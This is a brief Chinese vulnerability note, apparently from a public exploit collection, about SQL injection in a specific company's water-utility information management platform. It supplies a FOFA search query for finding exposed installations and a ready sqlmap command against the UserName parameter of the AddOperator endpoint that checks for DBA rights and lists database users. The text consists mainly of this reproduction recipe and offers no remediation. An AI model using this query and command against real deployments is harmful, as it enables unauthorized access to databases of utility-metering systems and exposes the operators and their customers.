### K8-11山东潍微科技股份有限公司水务信息管理平台存在sql注入漏洞

<u></u>





### 漏洞描述：山东潍微科技股份有限公司是一家以技术开发为主体的民营科技企业，专业致力于远传水、电、气、热四表及抄表系统的研发、生产与销售。



### Fofa语句：title="山东潍微科技股份有限公司 - 水务信息管理平台"



### 漏洞复现：

```sqlmap
Python sqlmap.py "http://172.0.0.1:6637/OperatorManager/AddOperator?operId=0&pointList=56&RoleName=3&Company=1&CustomDev=%E6%98%AF&DevList=56&_=1722235624980&UserName=abc" -p UserName --is-dba --users
```

